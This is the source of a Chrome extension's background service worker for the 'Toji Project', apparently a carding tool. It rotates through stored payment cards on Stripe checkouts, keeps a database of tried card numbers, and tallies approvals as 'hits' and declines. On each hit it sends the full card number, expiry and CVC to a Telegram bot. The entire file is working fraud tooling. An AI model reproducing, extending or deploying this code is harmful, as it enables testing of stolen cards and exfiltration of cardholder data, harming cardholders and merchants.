/**
 * Toji Project - Background Service Worker
 * Developed by @RealYashvirGaming
 */

import Storage from './storage.js';

class BackgroundService {
    constructor() {
        this.stats = { hits: 0, errors: 0, checkouts: 0 };
        this.activeCards = {};
        this.intentMap = {}; // In-memory cache for transaction resolution
        this.usedNumbers = new Set(); // NEW: Master Uniqueness Database
        this.transactionLocks = new Map(); // NEW: Deduplication Bridge
        this.logs = []; // Local cache for UI updates
        this._lastHitKey = null; // Prevent double hits per card/tab
        this.init();
    }

    async init() {
        console.log('[Toji] 🚀 System Initialization Sequence Starting...');

        // 1. Load persisted data first
        try {
            const data = await chrome.storage.local.get(['stats', 'logs', 'intentMap', 'usedNumbers', 'hits', 'errors', 'checkouts']);
            if (data.stats) this.stats = data.stats;
            if (data.logs) this.logs = data.logs;
            if (data.intentMap) this.intentMap = data.intentMap;
            if (data.usedNumbers) this.usedNumbers = new Set(data.usedNumbers);

            // Stats legacy support
            if (data.hits) this.stats.hits = data.hits;
            if (data.errors) this.stats.errors = data.errors;
            if (data.checkouts) this.stats.checkouts = data.checkouts;

            console.log(`[Toji] Deep Store Vault loaded: ${Object.keys(this.intentMap).length} mappings | ${this.usedNumbers.size} used cards`);
        } catch (e) {
            console.error('[Toji] Failed to load persisted state:', e);
        }

        // 2. Attach message listener
        chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
            const tabId = sender.tab ? sender.tab.id : null;

            // Site Settings
            if (message.type === 'GET_SETTINGS') {
                Storage.getSettings().then(sendResponse);
                return true;
            }

            // Stats Retrieval
            if (message.type === 'GET_STATS') {
                sendResponse(this.stats);
                return;
            }

            // Active Card Tracking (Tab-specific)
            if (message.type === 'SET_ACTIVE_CARD') {
                if (tabId) {
                    this.activeCards[tabId] = message.card;
                    console.log(`[Toji] Tab ${tabId} Active Card:`, message.card.number.slice(0, 6));
                }
                sendResponse({ ok: true });
                return;
            }

            // Deep Store Vault Sync
            if (message.type === 'STORE_INTENT_CARD') {
                if (message.intentIds && message.card) {
                    this.vaultIds(message.intentIds, message.card);
                }
                sendResponse({ ok: true });
                return;
            }

            // Unique CC Check (Central Authority)
            if (message.type === 'CHECK_AND_MARK_USED') {
                const num = (message.number || '').replace(/\D/g, '');
                if (!num || num.length < 13) {
                    sendResponse({ used: true });
                    return;
                }

                if (this.usedNumbers.has(num)) {
                    sendResponse({ used: true });
                } else {
                    this.usedNumbers.add(num);
                    // Persistent storage update
                    this.saveUsedNumbers();
                    sendResponse({ used: false });
                }
                return;
            }

            // Advanced Response Logging
            if (message.type === 'LOG_RESPONSE') {
                this.handleCapture(message.data, tabId, sendResponse);
                return true;
            }

            // Legacy reporting hooks
            if (message.type === 'REPORT_HIT') {
                const card = tabId ? this.activeCards[tabId] : null;
                this.recordHit(message.data, card);
                sendResponse({ ok: true });
                return;
            }

            if (message.type === 'RECORD_ERROR') {
                const card = tabId ? this.activeCards[tabId] : null;
                this.recordError(message.reason || 'DECLINED', card);
                sendResponse({ ok: true });
                return;
            }

            // Card Rotation Logic
            if (message.type === 'ADVANCE_CARD_INDEX') {
                Storage.getSettings().then(async (s) => {
                    const cards = s.cards || [];
                    if (cards.length === 0) return;
                    const nextIdx = ((s.cardIndex || 0) + 1) % cards.length;
                    await Storage.saveSettings({ ...s, cardIndex: nextIdx });
                    sendResponse({ ok: true, nextIdx });
                });
                return true;
            }

            // Systems Control
            if (message.type === 'EMERGENCY_STOP') {
                this.handleEmergencyStop(sendResponse);
                return true;
            }

            if (message.type === 'RESET_STATS') {
                this.resetStats(sendResponse);
                return true;
            }

            if (message.type === 'TEST_TG_PING') {
                this.testTelegram(message.token, message.chatId, sendResponse);
                return true;
            }
        });

        // 3. Final Broadcast
        this.broadcastStats();
        this.broadcastLogs(this.logs);
        this.addLog('SYSTEM_BOOT_SEQUENCE_COMPLETE', 'info');
    }

    /**
     * Persist Stripe IDs to the card vault
     */
    async vaultIds(ids, card) {
        if (!ids || !ids.length || !card) return;
        let changed = false;
        ids.forEach(id => {
            if (!this.intentMap[id]) {
                this.intentMap[id] = card;
                changed = true;
                console.log(`[Toji] Vaulted: ${id} -> ${card.number.slice(0, 6)}`);
            }
        });

        if (changed) {
            // Tidy vault (keep last 250)
            const keys = Object.keys(this.intentMap);
            if (keys.length > 250) {
                const toRemove = keys.slice(0, keys.length - 250);
                toRemove.forEach(k => delete this.intentMap[k]);
            }
            Storage.set({ intentMap: this.intentMap }); // Fast wrapper
            chrome.storage.local.set({ intentMap: this.intentMap }); // Hard persistence
            console.log(`[Toji] 🏛️ Vault Hardened: ${Object.keys(this.intentMap).length} entries`);
        }
    }

    async handleCapture(captureData, tabId, sendResponse) {
        const intentIds = captureData.intentIds || [];

        // 1. Resolve card from Deep Store Vault (Iterative Scan)
        let card = null;
        for (const id of intentIds) {
            if (this.intentMap[id]) {
                card = this.intentMap[id];
                console.log(`[Toji] 💎 Vault Match Found: ${id} -> ${card.number.slice(0, 6)}`);
                break;
            }
        }

        // 2. Fallback to direct payload or tab state
        if (!card) card = captureData.card || (tabId ? this.activeCards[tabId] : null);

        // 3. Auto-update vault if we have fallback data
        if (card && intentIds.length > 0) {
            this.vaultIds(intentIds, card);
        }

        console.log(`[Toji] LOG_RESPONSE from Tab ${tabId}. Found ${intentIds.length} IDs. Card Resolved: ${!!card}`, captureData.message);
        const m = (captureData.message || '').toUpperCase();
        const isSuccess = captureData.success === true;
        const firstId = intentIds[0] || 'direct';

        // 🛡️ NO_GUESS ID APPEND
        const logMsg = `${m} (${firstId})`;

        // Professional Error Detection (Aggressive)
        const isError = !isSuccess && (
            m.includes('DECLINE') || m.includes('FAIL') ||
            m.includes('ERROR') || m.includes('REFUSED') ||
            m.includes('INVALID') || m.includes('INCORRECT') ||
            m.includes('SECURITY CODE') || m.includes('REQUEST_FAILED') ||
            m.includes('INSUFFICIENT') || m.includes('FRAUD') ||
            m.includes('RESTRICTED') || m.includes('PICK_UP')
        );

        if (isSuccess) {
            const hitKey = `${tabId}_${card ? card.number.slice(-4) : 'unknown'}`;
            // ☢️ NUCLEAR DEDUPLICATION (HIT)
            let isDuplicate = false;
            for (const id of intentIds) {
                if (this.transactionLocks.get(id) === 'success') isDuplicate = true;
                this.transactionLocks.set(id, 'success');
            }

            if (!isDuplicate && this._lastHitKey !== hitKey) {
                this._lastHitKey = hitKey;
                this.recordHit({
                    gateway: captureData.site?.name || 'Stripe',
                    type: logMsg || 'SUCCESS'
                }, card);
            }
        } else if (isError) {
            // ☢️ NUCLEAR DEDUPLICATION (ERROR)
            let isDuplicate = false;
            for (const id of intentIds) {
                if (this.transactionLocks.has(id)) isDuplicate = true;
                this.transactionLocks.set(id, 'error');
            }

            if (!isDuplicate) {
                this.recordError(logMsg || 'DECLINED', card);
            } else {
                console.log('[Toji] 🛡️ Duplicate Error Blocked (Transaction Locked)');
            }
        } else {
            this.addLog(
                logMsg || 'Network Capture',
                'info',
                captureData.site || { name: 'GATEWAY' },
                card
            );
        }

        // Cleanup old locks every 10 mins
        if (this.transactionLocks.size > 500) {
            const firstKey = this.transactionLocks.keys().next().value;
            this.transactionLocks.delete(firstKey);
        }

        if (sendResponse) sendResponse({ ok: true });
    }

    async recordHit(data, card = null) {
        this.stats.hits++;
        this.stats.checkouts++;
        this.broadcastStats();
        Storage.set({ hits: this.stats.hits, checkouts: this.stats.checkouts });

        this.addLog(`HIT: ${data.gateway || 'STRIPE'}`, 'success', null, card);
        this.triggerAlerts(card, data);
    }

    async recordError(reason, card = null) {
        this.stats.errors++;
        this.stats.checkouts++;
        this.broadcastStats();
        Storage.set({ errors: this.stats.errors, checkouts: this.stats.checkouts });

        this.addLog(`DEC: ${reason}`, 'error', null, card);
        this.showNotification('❌ TOJI DECLINE', `Reason: ${reason}`, 'assets/toji.jpg');
    }

    async triggerAlerts(card, data) {
        // Desktop notification removed to favor dashboard toast as per user
        this.playHitSound();
        this.forwardHitToTelegram(card, data);
    }

    async handleEmergencyStop(sendResponse) {
        const s = await Storage.getSettings();
        await Storage.saveSettings({ ...s, enabled: false });
        this.addLog('EMERGENCY_STOP_TRIGGERED', 'error');

        chrome.tabs.query({}, (tabs) => {
            tabs.forEach(tab => {
                try { chrome.tabs.sendMessage(tab.id, { type: 'SYSTEM_STOP' }); } catch (e) { }
            });
        });

        this.broadcastStats();
        if (sendResponse) sendResponse({ ok: true });
    }

    async resetStats(sendResponse) {
        this.stats = { hits: 0, errors: 0, checkouts: 0 };
        this.activeCards = {};
        this.logs = [];
        this.intentMap = {};
        this.usedNumbers = new Set();

        this.broadcastStats();
        this.broadcastLogs([]);

        await Storage.set({ hits: 0, errors: 0, checkouts: 0, logs: [], intentMap: {} });
        await chrome.storage.local.set({ usedNumbers: [] });
        if (sendResponse) sendResponse({ ok: true });
    }

    async saveUsedNumbers() {
        // Enforce 10,000 card limit
        if (this.usedNumbers.size > 10000) {
            const arr = Array.from(this.usedNumbers);
            const purged = arr.slice(1000); // Purge oldest 1,000
            this.usedNumbers = new Set(purged);
            console.log('[Toji] 🛡️ Used CC database purged (10,000 limit reached)');
        }
        chrome.storage.local.set({ usedNumbers: Array.from(this.usedNumbers) });
    }

    async addLog(message, type = 'info', site = null, card = null) {
        const timestamp = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });

        let logCard = card;
        if (!logCard) {
            const settings = await Storage.getSettings();
            if (settings.cards && settings.cards.length > 0) {
                const idx = settings.cardIndex || 0;
                logCard = settings.cards[idx];
            }
        }

        let displayMsg = message;
        if (site && site.name) displayMsg = `[${site.name}] ${message}`;

        const logEntry = {
            time: timestamp,
            msg: displayMsg,
            type: type,
            card: logCard
        };

        this.logs.push(logEntry);
        if (this.logs.length > 200) this.logs.shift();

        Storage.set({ logs: this.logs });
        this.broadcastLogs(this.logs);
    }

    broadcastStats() {
        chrome.runtime.sendMessage({ type: 'STATS_UPDATE', stats: this.stats });
    }

    broadcastLogs(logs) {
        chrome.runtime.sendMessage({ type: 'LOG_UPDATE', logs });
    }

    showNotification(title, message, icon) {
        console.log(`[Toji] 🔔 Alert: ${title} - ${message}`);
    }

    async forwardHitToTelegram(card, hitData) {
        const s = await Storage.getSettings();
        if (!s.tgToken || !s.tgChatId) return;

        try {
            const ccStr = card ? `${card.number}|${card.month}|${card.year}|${card.cvc}` : 'Unknown_Card';
            const text = `🔥 *TOJI HIT SUCCESS* 🔥\n\n` +
                `💳 *Card:* \`${ccStr}\`\n` +
                `🏦 *Gateway:* ${hitData.gateway || 'Stripe'}\n` +
                `🕒 *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                `_Powered by Toji Project_`;

            fetch(`https://api.telegram.org/bot${s.tgToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: s.tgChatId, text, parse_mode: 'Markdown' })
            });
        } catch (e) { }
    }

    async playHitSound() {
        await this.ensureOffscreen();
        chrome.runtime.sendMessage({ type: 'PLAY_HIT_SND' });
    }

    async ensureOffscreen() {
        try {
            const contexts = await chrome.runtime.getContexts({ contextTypes: ['OFFSCREEN_DOCUMENT'] });
            if (contexts.length > 0) return;
            await chrome.offscreen.createDocument({
                url: 'src/core/offscreen.html',
                reasons: ['AUDIO_PLAYBACK'],
                justification: 'Toji requires audio feedback for successful hits.'
            });
        } catch (e) { }
    }
}

new BackgroundService();
console.log('[Toji] Background System Ready.');
